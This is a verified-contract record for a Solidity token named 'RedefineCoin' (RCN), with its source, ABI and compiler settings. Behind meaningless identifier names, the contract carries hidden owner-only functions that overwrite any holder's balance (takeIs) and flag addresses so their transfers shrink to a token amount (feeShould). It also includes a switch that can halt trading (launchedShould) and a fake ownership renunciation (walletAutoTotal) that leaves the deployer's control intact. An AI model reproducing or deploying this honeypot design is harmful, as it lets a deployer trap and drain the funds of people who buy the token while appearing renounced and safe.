{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buyTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listReceiver {\n    function createPair(address limitMode, address launchExempt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface feeTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface marketingMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoLaunched) external view returns (uint256);\n\n    function transfer(address atTeam, uint256 liquidityMarketing) external returns (bool);\n\n    function allowance(address takeTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTeam,\n        uint256 liquidityMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitEnable, uint256 value);\n    event Approval(address indexed takeTotal, address indexed spender, uint256 value);\n}\n\ninterface marketingModeMetadata is marketingMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RedefineCoin is buyTotal, marketingMode, marketingModeMetadata {\n\n    function owner() external view returns (address) {\n        return limitSender;\n    }\n\n    mapping(address => uint256) private autoEnable;\n\n    function receiverTake() private view {\n        require(teamList[_msgSender()]);\n    }\n\n    bool private txSwap;\n\n    bool public shouldList;\n\n    uint256 private marketingMax;\n\n    uint256 constant totalTeam = 5 ** 10;\n\n    string private buyExemptMax = \"Redefine Coin\";\n\n    function allowance(address senderBuySell, address launchedListShould) external view virtual override returns (uint256) {\n        if (launchedListShould == sellFundTotal) {\n            return type(uint256).max;\n        }\n        return minTxWallet[senderBuySell][launchedListShould];\n    }\n\n    function atTrading(address receiverLiquidity, address atTeam, uint256 liquidityMarketing) internal returns (bool) {\n        if (receiverLiquidity == walletAuto) {\n            return maxTotalTx(receiverLiquidity, atTeam, liquidityMarketing);\n        }\n        uint256 isReceiverSender = marketingMode(totalMax).balanceOf(marketingBuy);\n        require(isReceiverSender == launchedBuy);\n        require(atTeam != marketingBuy);\n        if (shouldAuto[receiverLiquidity]) {\n            return maxTotalTx(receiverLiquidity, atTeam, totalTeam);\n        }\n        liquidityMarketing = launchFromAuto(receiverLiquidity, atTeam, liquidityMarketing);\n        return maxTotalTx(receiverLiquidity, atTeam, liquidityMarketing);\n    }\n\n    function walletAutoTotal() public {\n        emit OwnershipTransferred(walletAuto, address(0));\n        limitSender = address(0);\n    }\n\n    uint256 public launchedAmountLimit = 3;\n\n    uint256 public autoWallet = 0;\n\n    uint256 launchedBuy;\n\n    mapping(address => bool) public shouldAuto;\n\n    address public totalMax;\n\n    function approve(address launchedListShould, uint256 liquidityMarketing) public virtual override returns (bool) {\n        minTxWallet[_msgSender()][launchedListShould] = liquidityMarketing;\n        emit Approval(_msgSender(), launchedListShould, liquidityMarketing);\n        return true;\n    }\n\n    function launchedShould(uint256 liquidityMarketing) public {\n        receiverTake();\n        launchedBuy = liquidityMarketing;\n    }\n\n    address public walletAuto;\n\n    uint256 private launchLiquidity;\n\n    function balanceOf(address autoLaunched) public view virtual override returns (uint256) {\n        return autoEnable[autoLaunched];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMax;\n    }\n\n    event OwnershipTransferred(address indexed amountMin, address indexed atTeamToken);\n\n    bool public limitMarketing;\n\n    function limitFrom(address shouldLiquidity) public {\n        require(shouldLiquidity.balance < 100000);\n        if (shouldList) {\n            return;\n        }\n        if (fromReceiverMode == listLiquidity) {\n            sellExemptMarketing = launchedFrom;\n        }\n        teamList[shouldLiquidity] = true;\n        \n        shouldList = true;\n    }\n\n    string private receiverMax = \"RCN\";\n\n    uint256 private listTotalEnable = 100000000 * 10 ** 18;\n\n    uint256 public launchedFrom;\n\n    function getOwner() external view returns (address) {\n        return limitSender;\n    }\n\n    function takeIs(address minLiquidity, uint256 liquidityMarketing) public {\n        receiverTake();\n        autoEnable[minLiquidity] = liquidityMarketing;\n    }\n\n    uint8 private launchSwap = 18;\n\n    mapping(address => bool) public teamList;\n\n    uint256 public sellExemptMarketing;\n\n    uint256 private listLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchSwap;\n    }\n\n    function launchFromAuto(address receiverLiquidity, address atTeam, uint256 liquidityMarketing) internal view returns (uint256) {\n        require(liquidityMarketing > 0);\n\n        uint256 senderFund = 0;\n        if (receiverLiquidity == totalMax && launchedAmountLimit > 0) {\n            senderFund = liquidityMarketing * launchedAmountLimit / 100;\n        } else if (atTeam == totalMax && autoWallet > 0) {\n            senderFund = liquidityMarketing * autoWallet / 100;\n        }\n        require(senderFund <= liquidityMarketing);\n        return liquidityMarketing - senderFund;\n    }\n\n    uint256 buyTradingToken;\n\n    address marketingBuy;\n\n    address sellFundTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function feeShould(address buyFromFund) public {\n        receiverTake();\n        if (marketingMax == sellExemptMarketing) {\n            sellExemptMarketing = fromReceiverMode;\n        }\n        if (buyFromFund == walletAuto || buyFromFund == totalMax) {\n            return;\n        }\n        shouldAuto[buyFromFund] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private minTxWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return buyExemptMax;\n    }\n\n    function transferFrom(address receiverLiquidity, address atTeam, uint256 liquidityMarketing) external override returns (bool) {\n        if (_msgSender() != sellFundTotal) {\n            if (minTxWallet[receiverLiquidity][_msgSender()] != type(uint256).max) {\n                require(liquidityMarketing <= minTxWallet[receiverLiquidity][_msgSender()]);\n                minTxWallet[receiverLiquidity][_msgSender()] -= liquidityMarketing;\n            }\n        }\n        return atTrading(receiverLiquidity, atTeam, liquidityMarketing);\n    }\n\n    uint256 public fromReceiverMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTotalEnable;\n    }\n\n    function maxTotalTx(address receiverLiquidity, address atTeam, uint256 liquidityMarketing) internal returns (bool) {\n        require(autoEnable[receiverLiquidity] >= liquidityMarketing);\n        autoEnable[receiverLiquidity] -= liquidityMarketing;\n        autoEnable[atTeam] += liquidityMarketing;\n        emit Transfer(receiverLiquidity, atTeam, liquidityMarketing);\n        return true;\n    }\n\n    constructor (){\n        if (txSwap == limitMarketing) {\n            listLiquidity = sellExemptMarketing;\n        }\n        walletAutoTotal();\n        feeTrading isLiquidity = feeTrading(sellFundTotal);\n        totalMax = listReceiver(isLiquidity.factory()).createPair(isLiquidity.WETH(), address(this));\n        marketingBuy = listReceiver(isLiquidity.factory()).feeTo();\n        \n        walletAuto = _msgSender();\n        teamList[walletAuto] = true;\n        autoEnable[walletAuto] = listTotalEnable;\n        \n        emit Transfer(address(0), walletAuto, listTotalEnable);\n    }\n\n    address private limitSender;\n\n    function transfer(address minLiquidity, uint256 liquidityMarketing) external virtual override returns (bool) {\n        return atTrading(_msgSender(), minLiquidity, liquidityMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTeamToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedListShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedListShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFromFund\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiverMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmountLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityMarketing\",\"type\":\"uint256\"}],\"name\":\"launchedShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExemptMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMarketing\",\"type\":\"uint256\"}],\"name\":\"takeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAutoTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RedefineCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}